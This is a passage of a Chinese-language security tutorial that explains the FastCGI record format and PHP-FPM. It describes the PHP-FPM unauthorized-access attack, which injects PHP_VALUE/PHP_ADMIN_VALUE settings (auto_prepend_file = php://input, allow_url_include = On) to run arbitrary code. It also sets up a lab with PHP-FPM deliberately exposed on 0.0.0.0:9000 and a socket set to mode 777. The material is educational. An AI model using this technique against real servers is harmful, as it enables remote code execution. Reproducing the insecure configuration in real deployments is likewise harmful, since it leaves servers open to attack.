</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token comment">/* Body 消息主体 */</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> contentData<span class="token punctuation">[</span>contentLength<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> paddingData<span class="token punctuation">[</span>paddingLength<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span> FCGI_Record<span class="token punctuation">;</span></pre></td></tr></table></figure><p>头由 8 个 uchar 类型的变量组成，每个变量一个字节。其中， <code>requestId</code>  占两个字节，一个唯一的标志 id，以避免多个请求之间的影响； <code>contentLength</code>  占两个字节，表示 Body 的大小。可见，一个 Fastcgi Record 结构最大支持的 Body 大小是 <code>2^16</code> ，也就是 65536 字节。</p>
<p>后端语言解析了 Fastcgi 头以后，拿到  <code>contentLength</code> ，然后再在请求的 TCP 流里读取大小等于  <code>contentLength</code>  的数据，这就是 Body 体。</p>
<p>Body 后面还有一段额外的数据（Padding），其长度由头中的  <code>paddingLength</code>  指定，起保留作用。不需要该 Padding 的时候，将其长度设置为 0 即可。</p>
<h3 id="fastcgi-type"><a class="anchor" href="#fastcgi-type">#</a> Fastcgi Type</h3>
<p>刚才我们介绍了 Fastcgi 协议中 Record 部分中各个结构的含义，其中第二个字节为  <code>type</code> ，我们将对其进行详细讲解。</p>
<p><code>type</code>  就是指定该 Record 的作用。因为 Fastcgi 中一个 Record 的大小是有限的，作用也是单一的，所以我们需要在一个 TCP 流里传输多个 Record，通过  <code>type</code>  来标志每个 Record 的作用，并用  <code>requestId</code>  来标识同一次请求的 id。也就是说，每次请求，会有多个 Record，他们的  <code>requestId</code>  是相同的。</p>
<p>下面给出一个表格，列出最主要的几种  <code>type</code> ：</p>
<table>
<thead>
<tr>
<th style="text-align:left">type 值</th>
<th style="text-align:left">具体含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">在与 php-fpm 建立连接之后发送的第一个消息中的 type 值就得为 1，用来表明此消息为请求开始的第一个消息</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">异常断开与 php-fpm 的交互</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">在与 php-fpm 交互中所发的最后一个消息中 type 值为此，以表明交互的正常结束</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">在交互过程中给 php-fpm 传递环境变量时，将 type 设为此，以表明消息中包含的数据为某个 name-value 对</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left">Web 服务器将从浏览器接收到的 POST 请求数据（表单提交等）以消息的形式发给 php-fpm，这种消息的 type 就得设为 5</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left">php-fpm 给 Web 服务器回的正常响应消息的 type 就设为 6</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">php-fpm 给 Web 服务器回的错误响应设为 7</td>
</tr>
</tbody>
</table>
<p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是  <code>type</code>  为 1 的 Record，后续互相交流，发送  <code>type</code>  为 4、5、6、7 的 Record，结束时发送  <code>type</code>  为 2、3 的 Record。</p>
<p>当后端语言接收到一个  <code>type</code>  为 4 的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，这就是环境变量。环境变量的结构如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB0<span class="token punctuation">;</span>  <span class="token comment">/* nameLengthB0  >> 7 == 0 */</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB0<span class="token punctuation">;</span> <span class="token comment">/* valueLengthB0 >> 7 == 0 */</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameData<span class="token punctuation">[</span>nameLength<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueData<span class="token punctuation">[</span>valueLength<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span> FCGI_NameValuePair11<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB0<span class="token punctuation">;</span>  <span class="token comment">/* nameLengthB0  >> 7 == 0 */</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB3<span class="token punctuation">;</span> <span class="token comment">/* valueLengthB3 >> 7 == 1 */</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB0<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameData<span class="token punctuation">[</span>nameLength<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueData<span class="token punctuation">[</span><span class="token function">valueLength</span></pre></td></tr><tr><td data-num="16"></td><td><pre>          <span class="token punctuation">(</span><span class="token punctuation">(</span>B3 <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>B2 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>B1 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> B0<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span> FCGI_NameValuePair14<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB3<span class="token punctuation">;</span>  <span class="token comment">/* nameLengthB3  >> 7 == 1 */</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB0<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB0<span class="token punctuation">;</span> <span class="token comment">/* valueLengthB0 >> 7 == 0 */</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameData<span class="token punctuation">[</span><span class="token function">nameLength</span></pre></td></tr><tr><td data-num="26"></td><td><pre>          <span class="token punctuation">(</span><span class="token punctuation">(</span>B3 <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>B2 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>B1 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> B0<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueData<span class="token punctuation">[</span>valueLength<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span> FCGI_NameValuePair41<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB3<span class="token punctuation">;</span>  <span class="token comment">/* nameLengthB3  >> 7 == 1 */</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameLengthB0<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB3<span class="token punctuation">;</span> <span class="token comment">/* valueLengthB3 >> 7 == 1 */</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueLengthB0<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> nameData<span class="token punctuation">[</span><span class="token function">nameLength</span></pre></td></tr><tr><td data-num="40"></td><td><pre>          <span class="token punctuation">(</span><span class="token punctuation">(</span>B3 <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>B2 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>B1 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> B0<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> valueData<span class="token punctuation">[</span><span class="token function">valueLength</span></pre></td></tr><tr><td data-num="42"></td><td><pre>          <span class="token punctuation">(</span><span class="token punctuation">(</span>B3 <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>B2 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>B1 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> B0<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span> FCGI_NameValuePair44<span class="token punctuation">;</span></pre></td></tr></table></figure><p>这其实是 4 个结构，至于用哪个结构，有如下规则：</p>
<ol>
<li>key、value 均小于 128 字节，用  <code>FCGI_NameValuePair11</code></li>
<li>key 大于 128 字节，value 小于 128 字节，用  <code>FCGI_NameValuePair41</code></li>
<li>key 小于 128 字节，value 大于 128 字节，用  <code>FCGI_NameValuePair14</code></li>
<li>key、value 均大于 128 字节，用  <code>FCGI_NameValuePair44</code></li>
</ol>
<p>为什么我只介绍  <code>type</code>  为 4 的 Record？因为环境变量在后面 PHP-FPM 里有重要作用，之后写代码也会写到这个结构。 <code>type</code>  的其他情况，大家可以自己翻文档理解理解。</p>
<h2 id="php-fpm"><a class="anchor" href="#php-fpm">#</a> PHP-FPM</h2>
<p>在前面我们也看到了 PHP-FPM 这个东西，那这个 PHP-FPM 到底是什么呢？</p>
<p>官方对 PHP-FPM 的解释是 FastCGI 进程管理器，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。PHP-FPM 默认监听的端口是 9000 端口。</p>
<p>也就是说 <strong>PHP-FPM 是 FastCGI 的一个具体实现</strong>，并且提供了进程管理的功能，在其中的进程中，包含了 master 和 worker 进程，这个在后面我们进行环境搭建的时候可以通过命令查看。其中<strong> master 进程负责与 Web 服务器中间件进行通信</strong>，接收服务器中间按照 FastCGI 的规则打包好的用户请求，再将请求转发给 worker 进程进行处理。**worker 进程主要负责后端动态执行 PHP 代码，** 处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。</p>
<p>举个例子，当用户访问  <code>http://127.0.0.1/index.php?a=1&amp;b=2</code>  时，如果 Web 目录是 /var/www/html，那么 Web 服务器中间件（如 Nginx）会将这个请求变成如下 key-value 对：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token char">'GATEWAY_INTERFACE'</span><span class="token operator">:</span> <span class="token char">'FastCGI/1.0'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token char">'REQUEST_METHOD'</span><span class="token operator">:</span> <span class="token char">'GET'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token char">'SCRIPT_FILENAME'</span><span class="token operator">:</span> <span class="token char">'/var/www/html/index.php'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token char">'SCRIPT_NAME'</span><span class="token operator">:</span> <span class="token char">'/index.php'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token char">'QUERY_STRING'</span><span class="token operator">:</span> <span class="token char">'?a=1&amp;b=2'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token char">'REQUEST_URI'</span><span class="token operator">:</span> <span class="token char">'/index.php?a=1&amp;b=2'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token char">'DOCUMENT_ROOT'</span><span class="token operator">:</span> <span class="token char">'/var/www/html'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token char">'SERVER_SOFTWARE'</span><span class="token operator">:</span> <span class="token char">'php/fcgiclient'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token char">'REMOTE_ADDR'</span><span class="token operator">:</span> <span class="token char">'127.0.0.1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token char">'REMOTE_PORT'</span><span class="token operator">:</span> <span class="token char">'12345'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token char">'SERVER_ADDR'</span><span class="token operator">:</span> <span class="token char">'127.0.0.1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token char">'SERVER_PORT'</span><span class="token operator">:</span> <span class="token char">'80'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token char">'SERVER_NAME'</span><span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token char">'SERVER_PROTOCOL'</span><span class="token operator">:</span> <span class="token char">'HTTP/1.1'</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这个数组其实就是 PHP 中  <code>$_SERVER</code>  数组的一部分，也就是 PHP 里的环境变量。但环境变量的作用不仅是填充  <code>$_SERVER</code>  数组，也是告诉 fpm：“我要执行哪个 PHP 文件”。</p>
<p>PHP-FPM 拿到 Fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行  <code>SCRIPT_FILENAME</code>  的值指向的 PHP 文件，也就是  <code>/var/www/html/index.php</code> 。但如果我们能够控制  <code>SCRIPT_FILENAME</code>  的值，不就可以让 PHP-FPM 执行服务器上任意的 PHP 文件了吗。写到这里，PHP-FPM 未授权访问漏洞差不多也就呼之欲出了。</p>
<h2 id="php-fpm-任意代码执行"><a class="anchor" href="#php-fpm-任意代码执行">#</a> PHP-FPM 任意代码执行</h2>
<p>前文我们讲到， Web 服务器中间件会将用户请求设置成环境变量，并且会出现一个  <code>'SCRIPT_FILENAME': '/var/www/html/index.php'</code>  这样的键值对，它的意思是 PHP-FPM 会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制 PHP-FPM 去执行某个已经存在的文件，不能够实现一些恶意代码的执行。并且在 PHP 5.3.9 后来的版本中，PHP 增加了  <code>security.limit_extensions</code>  安全选项，导致只能控制 PHP-FPM 执行一些像 php、php3、php4、php5、php7 这样的文件，因此你必须找到一个已经存在的 PHP 文件，这也增大了攻击的难度。</p>
<p>但是好在强大的 PHP 中有两个有趣的配置项：</p>
<ul>
<li><code>auto_prepend_file</code> ：告诉 PHP，在执行目标文件之前，先包含  <code>auto_prepend_file</code>  中指定的文件。</li>
<li><code>auto_append_file</code> ：告诉 PHP，在执行完成目标文件后，再包含  <code>auto_append_file</code>  指向的文件。</li>
</ul>
<p>那么就有趣了，假设我们设置  <code>auto_prepend_file</code>  为  <code>php://input</code> ，那么就等于在执行任何 PHP 文件前都要包含一遍 POST 的内容。所以，我们只需要把需要执行的代码放在 Body 中，他们就能被执行了。（当然，这还需要开启远程文件包含选项  <code>allow_url_include</code> ）</p>
<p>那么，我们怎么设置  <code>auto_prepend_file</code>  的值？</p>
<p>这就又涉及到 PHP-FPM 的两个环境变量， <code>PHP_VALUE</code>  和  <code>PHP_ADMIN_VALUE</code> 。这两个环境变量就是用来设置 PHP 配置项的， <code>PHP_VALUE</code>  可以设置模式为  <code>PHP_INI_USER</code>  和  <code>PHP_INI_ALL</code>  的选项， <code>PHP_ADMIN_VALUE</code>  可以设置所有选项。</p>
<p>所以，我们最后传入的就是如下的环境变量：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token char">'GATEWAY_INTERFACE'</span><span class="token operator">:</span> <span class="token char">'FastCGI/1.0'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token char">'REQUEST_METHOD'</span><span class="token operator">:</span> <span class="token char">'GET'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token char">'SCRIPT_FILENAME'</span><span class="token operator">:</span> <span class="token char">'/var/www/html/index.php'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token char">'SCRIPT_NAME'</span><span class="token operator">:</span> <span class="token char">'/index.php'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token char">'QUERY_STRING'</span><span class="token operator">:</span> <span class="token char">'?a=1&amp;b=2'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token char">'REQUEST_URI'</span><span class="token operator">:</span> <span class="token char">'/index.php?a=1&amp;b=2'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token char">'DOCUMENT_ROOT'</span><span class="token operator">:</span> <span class="token char">'/var/www/html'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token char">'SERVER_SOFTWARE'</span><span class="token operator">:</span> <span class="token char">'php/fcgiclient'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token char">'REMOTE_ADDR'</span><span class="token operator">:</span> <span class="token char">'127.0.0.1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token char">'REMOTE_PORT'</span><span class="token operator">:</span> <span class="token char">'12345'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token char">'SERVER_ADDR'</span><span class="token operator">:</span> <span class="token char">'127.0.0.1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token char">'SERVER_PORT'</span><span class="token operator">:</span> <span class="token char">'80'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token char">'SERVER_NAME'</span><span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token char">'SERVER_PROTOCOL'</span><span class="token operator">:</span> <span class="token char">'HTTP/1.1'</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token char">'PHP_VALUE'</span><span class="token operator">:</span> <span class="token char">'auto_prepend_file = php://input'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token char">'PHP_ADMIN_VALUE'</span><span class="token operator">:</span> <span class="token char">'allow_url_include = On'</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>设置  <code>auto_prepend_file = php://input</code>  且  <code>allow_url_include = On</code> ，然后将我们需要执行的代码放在 Body 中，即可执行任意代码。</p>
<h2 id="php-fpm-未授权访问漏洞"><a class="anchor" href="#php-fpm-未授权访问漏洞">#</a> PHP-FPM 未授权访问漏洞</h2>
<p>前文我们讲到，攻击者可以通过  <code>PHP_VALUE</code>  和  <code>PHP_ADMIN_VALUE</code>  这两个环境变量设置 PHP 配置选项  <code>auto_prepend_file</code>  和  <code>allow_url_include</code>  ，从而使 PHP-FPM 执行我们提供的任意代码，造成任意代码执行。除此之外，由于 PHP-FPM 和 Web 服务器中间件是通过网络进行沟通的，因此目前越来越多的集群将 PHP-FPM 直接绑定在公网上，所有人都可以对其进行访问。这样就意味着，任何人都可以伪装成 Web 服务器中间件来让 PHP-FPM 执行我们想执行的恶意代码。这就造成了 PHP-FPM 的未授权访问漏洞。</p>
<p>下面我们搭建环境，对 PHP-FPM 未授权访问漏洞的攻击过程进行讲解。</p>
<h3 id="环境搭建"><a class="anchor" href="#环境搭建">#</a> 环境搭建</h3>
<ul>
<li>靶 机：Ubuntu（192.168.0.175）</li>
<li>攻击机：Kali（192.168.0.128）</li>
</ul>
<p>这里直接在 Ubuntu 上安装 Nginx 和 php-fpm，首先安装 Nginx</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> nginx</pre></td></tr></table></figure><p>安装 php、php-fpm 以及一些插件</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> software-properties-common python-software-properties </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> add-apt-repository ppa:ondrej/php    <span class="token comment"># 这里容易卡死，解决方法是挂代理</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> update</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> php7.4</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token parameter variable">-y</span> <span class="token function">install</span> php7.4-fpm php7.4-mysql php7.4-curl php7.4-json php7.4-mbstring php7.4-xml php7.4-intl php7.4-pecl</pre></td></tr></table></figure><h3 id="配置-php-fpm"><a class="anchor" href="#配置-php-fpm">#</a> 配置 PHP-FPM</h3>
<p>接下来我们需要修改 PHP-FPM 的配置，设置监听 9000 端口来处理 nginx 的请求，并将 PHP-FPM 暴露在 0.0.0.0 上面。</p>
<p>打开  <code>/etc/php/7.4/fpm/pool.d/www.conf</code>  文件找到如下位置，注释掉第一行并添加第二行：</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">;</span>listen <span class="token operator">=</span> <span class="token operator">/</span>run<span class="token operator">/</span>php<span class="token operator">/</span>php7<span class="token operator">.</span><span class="token number">4</span><span class="token operator">-</span>fpm<span class="token operator">.</span>sock</pre></td></tr><tr><td data-num="2"></td><td><pre>listen <span class="token operator">=</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">:</span><span class="token number">9000</span></pre></td></tr></table></figure><p>此时将 PHP-FPM 的监听地址设置为了  <code>0.0.0.0:9000</code> ，便会产生 PHP-FPM 未授权访问漏洞，此时攻击者可以直接与暴露在目标主机 9000 端口上的 PHP-FPM 进行通信，进而可以实现任意代码执行。</p>
<p>下面修改权限</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">chmod</span> <span class="token number">777</span> /run/php/php7.4-fpm.sock</pre></td></tr></table></figure><p>打开 nginx 的配置文件  <code>/etc/nginx/sites-available/default</code>  修改相应部分的配置</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>server <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    listen       <span class="token number">80</span><span class="token punctuation">;</span> <span class="token comment">#监听 80 端口，接收 http 请求</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    server_name  www<span class="token operator">.</span>example<span class="token operator">.</span>com<span class="token punctuation">;</span> <span class="token comment">#就是网站地址</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    root <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span> <span class="token comment"># 准备存放代码工程的路径</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">#路由到网站根目录 www.example.com 时候的处理</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    location <span class="token operator">/</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        index index<span class="token operator">.</span>php<span class="token punctuation">;</span> <span class="token comment">#跳转到 www.example.com/index.php</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        autoindex on<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token comment">#当请求网站下 php 文件的时候，反向代理到 php-fpm</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    location <span class="token operator">~</span> \<span class="token operator">.</span><span class="token class-name type-declaration">php</span>$ <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        fastcgi_split_path_info <span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">.</span><span class="token operator">+</span>\<span class="token operator">.</span>php<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">+</span><span class="token punctuation">)</span>$<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        fastcgi_pass <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">:</span><span class="token number">9000</span><span class="token punctuation">;</span><span class="token comment">#nginx fastcgi 进程监听的 IP 地址和端口</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment">#fastcgi_pass unix:/run/php/php7.4-fpm.sock;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        fastcgi_index index<span class="token operator">.</span>php<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">include</span> fastcgi_params<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="启动环境"><a class="anchor" href="#启动环境">#</a> 启动环境</h3>
<p>配置完成后查看一下 php-fpm 的安装位置，然后启动</p>
